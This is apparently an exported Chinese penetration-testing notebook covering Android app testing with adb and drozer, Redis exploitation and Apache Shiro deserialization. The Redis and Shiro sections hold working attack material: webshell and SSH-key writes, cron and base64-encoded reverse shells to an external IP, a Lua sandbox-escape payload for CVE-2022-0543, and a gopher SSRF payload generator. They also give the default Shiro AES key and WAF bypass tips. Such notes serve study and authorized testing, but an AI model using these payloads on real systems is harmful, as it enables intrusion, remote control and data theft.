工具 https://github.com/yeahx/KubeAPI-Inspector/blob/main/README_zh.md https://github.com/cdk-team/CDK 参考文章 https://www.bilibili.com/video/BV12om2YTEgW/?spm_id_from=333.788.player.switch&vd_source=09b7dbe7a7fc964ca09096bdd79f031d&p=102 | 第98天：云上攻防-云原生篇&K8s安全&Config泄漏&Etcd存储&Dashboard鉴权&Proxy暴露_哔哩哔哩_bilibili https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw | mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ | mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ https://forum.butian.net/share/1095 | 奇安信攻防社区-云原生之Kubernetes安全 https://wiki.teamssix.com/CloudNative/Kubernetes/k8s-horizontal-taints.html | https://kubernetes.io/zh-cn/docs/concepts/scheduling-eviction/assign-pod-node/ | 将 Pod 指派给节点 | Kubernetes https://golangguide.top/%E6%9E%B6%E6%9E%84/%E4%BA%91%E5%8E%9F%E7%94%9F/%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%E7%82%B9/k8s%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88.html#%E6%80%8E%E4%B9%88%E8%B0%83%E7%94%A8%E6%9C%8D%E5%8A%A1 | golangguide.top/架构/云原生/核心知识点/k8s到底是什么.html#怎么调用服务 https://stack.chaitin.com/techblog/detail/218 | CT Stack 安全社区 https://github.com/sule01u/AutorizePro?tab=readme-ov-file | github.com/sule01u/AutorizePro?tab=readme-ov-file Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-06 21:37:15 "},"01.渗透测试/04.移动安全/APP渗透.html":{"url":"01.渗透测试/04.移动安全/APP渗透.html","title":"APP渗透总结","keywords":"","body":"Android知识 APK文件 APK（Android Package）文件是Android操作系统上安装应用程序的一种文件格式。APK文件实际上是一个压缩文件，它包含了应用程序的所有代码、资源和其他文件。 APK文件通常具有以下结构： AndroidManifest.xml：这是APK文件的主要配置文件，它包含应用程序的所有信息，包括应用程序名称、权限、组件等。 classes.dex：这是APK文件中的核心代码文件，它包含了应用程序的所有Java代码。 DEX（Dalvik Executable）文件是一种专门为Android操作系统设计的可执行文件格式。它是将Java字节码转换为Dalvik字节码的结果。Dalvik字节码是一种特殊的字节码，用于在Android设备上执行Java代码。 Android应用程序中的所有Java代码都被编译成DEX文件，然后打包到APK文件中。当用户安装应用程序时，DEX文件会被解压并加载到设备的内存中，以便在设备上执行应用程序。 resources.arsc: 包含了应用程序的所有非代码资源，如字符串、图像、布局、主题等等。该文件是应用程序中的重要组成部分，用于支持应用程序的多语言和多种配置。 lib/：这个目录包含了应用程序使用的所有本地库文件，通常按照不同的CPU架构分别存放。 res/：这个目录包含了应用程序的所有资源文件，例如布局、字符串、图像等。 assets/：这个目录包含了应用程序的所有未编译的资源文件，例如声音、视频等。 META-INF/：这个目录包含了APK文件的数字签名信息。 Android 四大应用程序组件 安卓应用程序组件指的是构成安卓应用程序的基本单元，主要有以下四种： 组件名称 具体用途 活动（Activity） 负责管理应用程序的用户界面，通过活动可以与用户交互即呈现可供用户交互的界面 服务（Service） 在后台运行的组件，不具有用户界面，主要用于执行长时间运行的任务或处理与用户界面无关的操作。 广播接收器（Broadcast Receiver） 用于接收系统广播和应用程序广播。即注册特定事件，并在其发生时被激活，例如电池电量变化、屏幕开关、网络连接状态等，也可以接收来自其他应用程序发送的广播。 内容提供者（Content Provider） 用于管理应用程序的数据，允许其他应用程序访问和共享应用程序的数据。内容提供者可以访问文件系统、SQLite 数据库、网络等数据源。 Android应用存储数据 对 android 的每一个应用，android 系统会分配一个私有目录，用于存储应用的私有数据。此私有目录通常位于/data/data/应用名称/ ADB使用 Android 调试桥 (adb) 是一种功能多样的命令行工具，可让您与设备进行通信。adb 命令可用于执行各种设备操作，例如安装和调试应用。adb 提供对 Unix shell（可用来在设备上运行各种命令）的访问权限。它是一种客户端-服务器程序，包括以下三个组件： 客户端（对应PC）：用于发送命令。客户端在开发机器上运行。您可以通过发出 adb 命令从命令行终端调用客户端。 守护程序 (adbd)：用于在设备上运行命令。守护程序在每个设备上作为后台进程运行。 服务端：用于管理客户端与守护程序之间的通信。服务器在开发机器上作为后台进程运行。 Android SDK默认自带adb，它位于Android SDK的platform-tools目录中 常用命令 adb version # 查看adb版本 adb devices -l # 列出设备 adb tcpip 5555 # 服务端开启5555端口 adb connect ip:port # 连接设备 adb disconnect ip:port # 关闭设备连接 adb -s service command # 多个设备时-s指定设备 adb install path_to_apk -t # 安装apk adb push pc_file Android _path # 上传文件 adb pull Android _file pc_path # 下载文件 # 命令行操作 adb -s service shell # 获得指定设备的shell # 执行命令 adb -s service shell command # 或者进入后 shell>command # 命令在/system/bin中 pm list packages # 查看应用列表 pm list packages -e -3 # 查询设备上所有已启用的第三方应用程序的包名列表 getprop ro.build.version.release # 安卓系统版本 screencap Android _path # 截图 screenrecord /sdcard/demo.mp4 # 录屏 遇到的问题 more than one device and emulator 使用-s参数指定设备 adb server version (41) doesn't match this client (39); killing adb客户端和服务端版本不一致 由于找不到adbwinapi.dll,无法继续执行代码。重新安装程序可能会解决此问题 环境变量问题 解：将adb.exe文件复制到Windows/system32下; ​ 将adbwinapi.dll复制到Windows/sysWoW64下。 ​ 解决 ​ 更改名字，替换模拟器中的adb即可,成功截图 测试checklist 客户端程序安全 安装包签名校验 如果 APK 没有 使用自己的证书进行签名，将会失去对版本管理的主动权。 jarsigner -verify -certs -verbose apk jadx-gui 反编译保护 没有反编译保护，可能被恶意人员进行逆向破解等操作。 直接使用jadx-gui打开即可，如果混淆后的代码样例，除了覆写和接口以外的字段都是无意义的名称，则说明是安全的，如下即为安全的。 应用完整性校检 攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。 解包 java -jar apktool.jar d -f APK -o DIR 修改资源文件 改一些容易分辨的，比如logo assets/pmbwe64/css/banklogo/logo 打包 java -jar apktool.jar b -f DIR -o new.apk 对生成的APK进行签名 APK 必须进行签名后，方可安装和运行。如果开启了“允许未知来源的应 用”，那么 Debug 证书、自签名证书、过期证书的签名都是可以的，但是不可以不签 名。 java -jar signapk.jar testkey.x509.pem testkey.pk8 待签名APK 输出APK 重新安装启动，观察是否有自校验 不恰当的配置 Debug模式 客户端软件 AndroidManifest.xml 中的 android:debuggable=\"true\"标记如果开启，可被Java 调试工具例如 jdb 进行调试，获取和篡改用户敏感信息，甚至分析并且修改代码实现的业务逻辑，我们经常使用 android.util.Log 来打印日志，软件发布后调试日志被其他开发者看到，容易被反编译破解。 应用程序数据可备份 AndroidMainfest.xml 文件中的 allowBackup 属性值控制，其默认值为 true。当该属性没有显式设置为 false 时,攻击者可通过 adb backup 和 adb restore 对 App 的应用数据进行备份和恢复，从而可能获取明文存储的用户敏感信息。 使用jadx-gui打开搜索即可 敏感信息安全测试 APK反编译源码中泄漏的敏感信息 jadx-gui搜索 漏扫平台 私有目录下的文件权限 ADB连接查看 私有目录下的文件信息泄漏 ADB连接查找 日志是否打印敏感数据 adb logcat //持续输出日志，直到 Ctrl+C adb logcat -d > log.txt //一次性输出日志缓存，不会阻塞 补充：原创]Android APP漏洞之战（7）——信息泄露漏洞详解-Android安全-看雪-安全社区|安全招聘|kanxue.com 四大应用程序组件测试 测试用APK https://github.com/as0ler/Android-Examples/blob/master/sieve.apk qark/tests/goatdroid.apk at master · linkedin/qark (github.com) drozer安装 PC控制端安装 # 安装依赖 python2 -m pip install wheel python2 -m pip install pyyaml python2 -m pip install pyhamcrest python2 -m pip install protobuf python2 -m pip install pyopenssl python2 -m pip install twisted python2 -m pip install service_identity # 下载whl到本地 wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl python2 -m pip install drozer-2.4.4-py2-none-any.whl 设备端agent安装 wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk adb install drozer-agent-2.3.4.apk 连接 设备端开启drozer pc控制端（注意在D:\\python2.7\\Scripts下启动drozer） # 端口转发 adb forward tcp:31415 tcp:31415 # 连接 drozer console connect 出现下图表示连接成功 乱码解决 D:\\python2.7\\Lib\\site-packages\\drozer\\modules\\app下的package.py # 开头添加 import sys reload(sys) sys.setdefaultencoding('utf-8') # 360,362行指定字符串为unicode字符串，前缀\"u\" self.stdout.write(u\"%s\\n\" % application.packageName) Package 根据名字查找APK # run app.package.list -f dz> run app.package.list -f sieve com.mwr.example.sieve (Sieve) 获得APK的基本信息 # run app.package.info -a dz> run app.package.info -a com.mwr.example.sieve Package: com.mwr.example.sieve Application Label: Sieve Process Name: com.mwr.example.sieve Version: 1.0 Data Directory: /data/user/0/com.mwr.example.sieve APK Path: /data/app/com.mwr.example.sieve-1/base.apk UID: 10046 GID: [3003] Shared Libraries: null Shared User ID: null Uses Permissions: - android.permission.READ_EXTERNAL_STORAGE - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.INTERNET Defines Permissions: - com.mwr.example.sieve.READ_KEYS - com.mwr.example.sieve.WRITE_KEYS 一键检测APK存在的攻击面 dz> run app.package.attacksurface com.mwr.example.sieve Attack Surface: 3 activities exported 0 broadcast receivers exported 2 content providers exported 2 services exported is debuggable 是包名。 可以看到有3个activity、0个广播接收者、2个内容提供者和2个服务可以被导出，并且开启了debug模式 Activity 漏洞种类 危害 越权绕过 Activity 用户界面绕过会造成用户信息窃取 拒绝服务 通过 Intent 给 Activity 传输畸形数据使得程序崩溃从而影响用户体验 Activity 劫持 组件导出导致钓鱼欺诈，Activity 界面被劫持产生欺诈等安全事件 隐式启动 intent 包含敏感数据 敏感信息泄露 获取可导出activity 在 Android 系统中，Activity 组件默认是不导出的，如果 AndroidManifest.xml 中设置了 exported = \"true\" 这样的关键值或者是添加了 这样的属性，那么此时 Activity 组件是导出的，就会引发越权绕过或者是泄露敏感信息等的安全风险。 drozer获得可导出activity # run app.activity.info -a dz> run app.activity.info -a com.mwr.example.sieve Package: com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity Permission: null com.mwr.example.sieve.MainLoginActivity Permission: null com.mwr.example.sieve.PWList Permission: null 越权绕过测试 正常第一次打开是这样的 对应的是MainLoginActivity这个activity 调用PWList这个activity，实现登录绕过界面 dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList Activity劫持 # 环境准备 wget https://github.com/yanghaoi/android_app/raw/master/uihijackv2.0_sign.apk # 安装点击劫持软件 adb install uihijackv2.0_sign.apk 劫持测试 dz> run app.package.list -f jack com.test.uihijack (Hijack测试) dz> run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity 在打开原activity的基础上，调用此组件，如果uihijackv2.0_sign界面位于被测软件上，则存在漏洞，否则不存在漏洞。如下图为存在漏洞的情况。 拒绝服务攻击 调用组件，查看是否导致拒绝服务，若程序出现 程序崩溃、已停止运行 等程序无法运行或自动退出行为则为攻击成功。 http://rui0.cn/archives/30 Content-Provider 漏洞种类 危害 信息泄露 查看组件数据信息 SQL注入 注入获取相关数据 目录遍历 访问任意可读文件 查看 provider 数据组件信息 run app.provider.info -a com.mwr.example.sieve 信息泄漏 run scanner.provider.finduris -a com.mwr.example.sieve 关注红框部分，可能存在数据泄露，查询语句如下 run app.provider.query sql注入 Android使用的是sqlite sqlite注入的一点总结 - 先知社区 (aliyun.com) 进行sql注入扫描 run scanner.provider.injection -a 进一步利用 单引号报错 # 双引号内为注入的语句 run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection \"'\" 查询所有表 run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection \"* FROM SQLITE_MASTER WHERE type='table';--\" 查询Passwords表 run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection \"* FROM Passwords;--\" 目录遍历 目录遍历漏洞扫描 run scanner.provider.traversal -a com.mwr.example.sieve 利用目录遍历读取文件 /etc/hosts run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 应用db文件 run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db 下载文件 run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:/Users/Khaz/Desktop/database.db Broadcast Receiver 漏 洞种类 危害 敏感信息泄露 发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。 权限绕过 可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等 消息伪造 暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患 拒绝服务 如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。 拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。 查看可导出组件 broadcast run app.broadcast.info -a org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver 找到对应广播 消息伪造 使用jadx反编译找到对应的源码信息，发现需要两个参数 phoneNumber、message 发送恶意广播 run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 12345 --extra string message khaz 拒绝服务 发送不完整的广播 run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS Services 漏洞种类 危害 权限提升 当一个service配置了intent-filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。 service劫持 隐式启动services,当存在同名services,先安装应用的services优先级高 消息伪造 暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患 拒绝服务 Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃 获取可导出服务 # run app.service.info -a dz> run app.service.info -a com.mwr.example.sieve Package: com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission: null com.mwr.example.sieve.CryptoService Permission: null 其他测试姿势 通过更改手机的型号来重置APP中的体验次数 其他工具 APP模拟器 夜神模拟器>7.0.2（XPosed框架要求） 反编译 jadx-gui GDA主页-亚洲首款交互式Android反编译器 APK签名 GetAPKInfo（验签） apktool（打包/解包） signapk（签名） APK漏扫 MobSF 摸瓜-查诈骗APP查病毒APP免费APK反编译分析工具 (mogua.co) 其他小工具 AppInfoScanner 前提条件是脱了壳 一款适用于以HW行动/红队/渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。 sulab999/AppMessenger: 一款适用于以APP病毒分析、APP漏洞挖掘、APP开发、HW行动/红队/渗透测试团队为场景的移动端(Android、iOS)辅助分析工具 参考文章 App安全检测指南 https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html App防抓包有四种绕过方法（详细） 如何使用Xposed+JustTrustMe来突破SSL Pinning - 知乎 Android 调试桥 (adb) | Android 开发者 | Android Developers 推荐：WindXaa/Android-Vulnerability-Mining: Android APP漏洞之战系列，主要讲述如何快速挖掘APP漏洞 (github.com) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:49:04 "},"01.渗透测试/04.移动安全/环境.html":{"url":"01.渗透测试/04.移动安全/环境.html","title":"环境","keywords":"","body":"APP抓包 环境检测 过Root检测 Magsik+Shamiko白名单 过Frida检测（包名，特征，端口） https://github.com/suifei/fridare https://github.com/CrackerCat/strongR-frida-android 过代理检测 SSLUnpinning，算法助手Pro 抓包代理软件 Tun2Socks，Reqable，Wifi代理 脱壳 脱壳最主要的目的是还原被混淆、抽取的函数，便于上钩子或调试、阅读代码。 查壳 MagiCiAn1/APKProtectionSearch: apk查壳工具 (github.com) MT/NP管理器 APK Messenger GDA 脱壳 BlackDex 面具DITOR模块 脱壳工具：反射大师的使用详解-CSDN博客 dstmath/frida-unpack: 基于Frida的脱壳工具 (github.com) https://github.com/hluwa/frida-dexdump Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:49:08 "},"01.渗透测试/05.漏洞复现/Redis漏洞.html":{"url":"01.渗透测试/05.漏洞复现/Redis漏洞.html","title":"Redis漏洞","keywords":"","body":"环境搭建 Redis - 各平台搭建Redis - 听雨危楼 - 博客园 (cnblogs.com) Vulhub 基本了解 Redis是C语言开发一个开源(遵循BSD)协议高性能的(key-value)键值对的内存NoSQL数据库,可以用作数据库、缓存、信息中间件(性能非常优秀，支持持久化到硬盘且高可用)，由于其自身特点，可以广泛应用在数据集群，分布式队列，信息中间件等网络架构中。 Redis数据库常用命令 # 启动 redis-server /etc/redis.conf redis-cli -h host # 免密登录 redis-cli -h host -p port -a password # 使用 Redis 密码登录 Redis 服务 # 进入命令行后 config get requirepass # 查看密码 config set requirepass passwd # 设置密码 auth passwd # 认证 info # 相关信息 SET key \"Hello World\" # 设置键 key 的值为字符串 Hello World GET key # 获取键 key 的值，如果 key 不存在，返回 nil 。如果key 储存的值不是字符串类型，返回一个错误 DEL key # 删除键 key KEYS * # 获取 redis 中所有的 key,Keys 命令用于查找所有符合给定模式 pattern 的 key SAVE # 用于创建当前数据库的备份,在 redis 安装目录中创建dump.rdb文件 CONFIG GET requirepass # 用于获取 redis 服务的配置参数，通过 CONFIG 命令查看或设置配置项 Flushall # 用于清空整个 Redis 服务器的数据(删除所有数据库的所有 key) SELECT index # Redis Select 命令用于切换到指定的数据库，数据库索引号 index 用数字值指定，以 0 作为起始索引值。 redis服务器与客户端通信 Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。 抓包 tcpdump port 6379 -w ./redis.pcap 执行命令 127.0.0.1:6379> auth 123456 OK 127.0.0.1:6379> set name khaz OK 127.0.0.1:6379> get name \"khaz\" 对应的数据包如下，每一行都是用\\r\\n隔开的。 对于Simple Strings，回复的第一个字节是+ 对于error，回复的第一个字节是- 对于Integer，回复的第一个字节是: 对于Bulk Strings，回复的第一个字节是$ 对于array，回复的第一个字节是* 此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。 在RESP中，协议的不同部分始终以\"\\r\\n\"(CRLF)结束。 利用备份功能写入文件 原理 redis提供了备份数据库的功能，备份的文件名和备份的路径都可以通过 config set dbfilename config set dir 来控制,从而可以实现任意文件写功能。 注意点 数据库备份为快照文件存在一定格式(脏数据)，所以写入的内容需要加上换行符。 flushall命令 flushall命令会清空所有缓存数据,这个在一定程度不会造成巨大的损失，但是会给业务体验带来影响。 redis默认有16个数据库 所以不用flushall来清空默认0号的数据库内容，只需要切换到其他的空数据库即可 dbsize # 查看当前数据库的key数量 select 4 # 选择没有数据的数据库 写入Webshell root权限执行的redis或者以某个web服务启动的redis 知道网站web路径 select 5 set 1 '\\n\\n\\n\\n' config set dir /var/www/html config set dbfilename shell.php save 写入ssh公钥 高权限 select 5 set 1 \"\\n\\n公钥内容\\n\\n\" config set dir /root/.ssh/ config set dbfilename authorized_keys save 写入计划任务反弹shell root权限 Centos系统 因为默认redis写文件后是644的权限 ubuntu要求定时任务文件权限必须是600 Centos的定时任务文件权限644也能执行 因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错 select 5 set 1 '\\n\\n*/1 * * * * bash -i >& /dev/tcp/124.220.192.120/1234 0>&1\\n\\n' config set dir /var/spool/cron/ config set dbfilename root save 定时任务位置 /etc/crontab文件 /etc/cron.xxx目录 /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ 用户定时目录 # Debian系列（Ubuntu） /var/spool/cron/crontabs/ # RedHat系列（Centos） /var/spool/cron/ 主从复制RCE 4.x >= Version 主从复制是指将一台Redis服务器的数据，复制到其他的Redis服务器。 前者称为主节点(master)，后者称为从节点(slave). 数据的复制是单向的，只能由主节点到从节点。 从节点在接收数据时，会先将自身的数据清空。 建立主从关系只需要在从节点操作就行了，主节点不用任何操作 主从复制RCE简单的说就是将Rouge Server（主节点）上的恶意.so文件复制到目标主机（从节点）上，从而达到RCE。 Lua沙盒逃逸--CVE-2022-0543 漏洞复现 运行在Debian系列的linux上的Redis 实际上是系统问题，而不是redis的问题 在 Debian 系的 Linux 发行版系统上，Lua的package 变量没有被正确清除，导致攻击者可以利用它来进行 Lua 沙箱逃逸，从而执行任意系统命令。 借助Lua沙箱中遗留的变量package的loadlib函数来加载动态链接库/usr/lib/x86_64-linux-gnu/liblua5.1.so.0里的导出函数luaopen_io。在Lua中执行这个导出函数，即可获得io库，再使用其执行命令： local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res 注意不同环境下的liblua库路径不同，需要指定一个正确的路径 连接redis，使用eval命令执行上述脚本： eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0 工具一键执行命令 Shiro-Redis反序列化 shiro默认将session存储在内存里面。这样导致shiro的session是不共享的。使用redis来存储shiro session可以让其他服务也共享shiro的认证信息。 过程：shiro会根据jessionid来找到存储于redis中的session信息，并对其进行反序列化。 向redis中插入恶意session信息 import pyyso import redis redis_conn=redis.StrictRedis(host=\"192.168.1.104\", port=6379,password=\"abc123\") # whatever 是 session 名称 whatever=b\"123\" key=b\"shiro:session:\"+whatever value=pyyso.cb1v192('bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}\"') print(value) redis_conn.set(key,value) 更改改JESSIONID为123，再次访问即可触发反序列化。 SSRF打Redis 低版本情况 配合http请求 低版本的Redis会将http请求的请求头内容作为redis命令解析 需要认证情况 先找到redis服务的认证密码，转到未授权情况 配置文件 # 通过requirepass来定位密码 /etc/redis.conf /etc/redis/redis.conf /usr/local/redis/etc/redis.conf /opt/redis/ect/redis.conf 弱密码爆破 dict://192.168.174.129:6379/AUTH passwd 认证成功 认证失败 未授权情况 配合dict协议 dict://x.x.x.x:6379/ 配合gopher协议 首先要将命令转换为RESP协议格式 import urllib.request, urllib.parse, urllib.error protocol=\"gopher://\" ip=\"192.168.163.128\" port=\"6379\" # 写马 shell=\"\\n\\n\\n\\n\" #写入的文件内容 filename=\"shell.php\" path=\"/var/www/html\" # web目录 # 写ssh公钥 /* filename=\"authorized_keys\" ssh_pub=\"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\\n\\n\" path=\"/root/.ssh/\" */ # 计划任务反弹shell 系统必须为Centos，定时任务权限问题：Centos--644 Ubuntu--600 /* reverse_ip=\"192.168.163.132\" reverse_port=\"2333\" cron=\"\\n\\n\\n\\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\\n\\n\\n\\n\"%(reverse_ip,reverse_port) filename=\"root\" path=\"/var/spool/cron\" */ passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")), \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] # 如果redis需要认证，就在cmd第一行插入认证命令 if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) payload=protocol+ip+\":\"+port+\"/_\" # \"/_\" gopher协议特性，会吃掉url后的一个字符 def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.parse.quote(redis_format(x)) print(payload) Windows下的思路--没试 Windows的Redis版本停留在3.2 Windows的自启动：系统服务、计划任务、注册表启动项、用户的startup目录 踩坑记录-Redis(Windows)的getshell - 先知社区 (aliyun.com) Redis挖矿 Redis 未授权访问漏洞分析 cleanfda 脚本复现漏洞挖矿 - 博客文章 - 任霏的个人博客网站 https://www.renfei.net/posts/1003501 漏洞利用工具 yuyan-sec/RedisEXP: Redis 漏洞利用工具 (github.com) n0b0dyCN/redis-rogue-server: Redis( 参考文章 浅析Linux下Redis的攻击面(一) - 先知社区 (aliyun.com) redis未授权到shiro反序列化 - 先知社区 (aliyun.com) redis未授权到shiro反序列化之session回显马|NOSEC安全讯息平台 - 白帽汇安全研究院 浅析Redis中SSRF的利用 - 先知社区 (aliyun.com) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-21 18:47:08 "},"01.渗透测试/05.漏洞复现/shiro漏洞.html":{"url":"01.渗透测试/05.漏洞复现/shiro漏洞.html","title":"Shiro漏洞","keywords":"","body":"Shiro概述 ​ Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 ​ 通常与tomcat一起使用，也可以替换spring security集成到spring中（如若依）。 框架特征 在请求包的Cookie中有rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在rememberMe=deleteMe字段，说明目标有使用Shiro框架 反序列化漏洞 ​ Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。 在服务端对rememberMe的cookie值的处理 RememberMe Cookie值 => base64解码 => AES解密 => 反序列化 如果知道AES的密钥就可以构造恶意cookie，从而造成反序列化RCE漏洞。所以这也是shiro反序列化经久不衰的原因。 payload生成 恶意类 => 序列化 => AES加密 => base64编码 shiro-550 ​ Apache Shiro 1.2.5之前的版本在org.apache.shiro.mgt.AbstractRememberMeManager中存在AES默认秘钥kPH+bIxk5D2deZiIxcaaaA==。 ​ 在之后的版本，密钥为随机生成的，但是挡不住开发人员的安全意识不到位。 shiro-721 概述 ​ Apache Shiro 1.4.2之前的版本默认使用AES/CBC/PKCS5Padding模式加密，该加密模式存在缺陷，当攻击者获得一个有效的rememberMe Cookie值时，可以通过Padding Oracle Attack构造有效的恶意序列化数据来发起攻击。 复现 参考inspiringz/Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com) 注意点：因为爆破的时间太长（几个小时），不适用于实际环境的测试。会把环境打崩或者ip被ban 正常登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。 使用RememberMe cookie作为Padding Oracle Attack的前缀。 加密 ysoserial 的序列化 payload，通过Padding Oracle Attack制作恶意RememberMe。 重放恶意RememberMe cookie，以执行反序列化攻击。 修复 在之后的版本加密模式 AES-CBC被更换为 AES-GCM，所以在使用工具等时需要注意该加密模式的变化。 反序列化漏洞常见问题 密钥获取 github收集 securityManager.rememberMeManager.cipherKey cookieRememberMeManager.setCipherKey setCipherKey(Base64.decode 任意文件读取/下载 heapdump 爆破 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送。 当密钥正确时不返回deleteMe 密钥错误时返回 deleteMe 还有一种情况，如果秘钥正确返回的是一个 deleteMe，密钥错误返回的是两个 deleteMe。 WAF绕过 cookie内容检测 Tomcat 9.0.19 插入\\x0d 插入Base64垃圾数据绕过（FUZZ） 未知http请求 未知http请求时，shiro是先处理cookie后在到servlet，所以rememberMe值是会处理的 请求头大小被限制 tomcat默认header最大长度设置为8192字节 人为对Cookie长度进行限制 解决思路： shiro的payload长度限制绕过-CSDN博客 浅析Shiro反序列化Payload长度绕过 (qq.com) 第一种解决方法复现 Tomcat允许的HTTP Header最大值maxHttpHeaderSize header过长，服务端报400错误 构造header头的类构造器 构造CB链进行序列化 将test.bin文件进行处理 生成外部字节码内容 public class CalcTest { public CalcTest() throws Exception { Runtime.getRuntime().exec(\"calc\"); } } javac CalcTest.java cat CalcTest.class |base64|sed ':label;N;s/\\n//;b label' 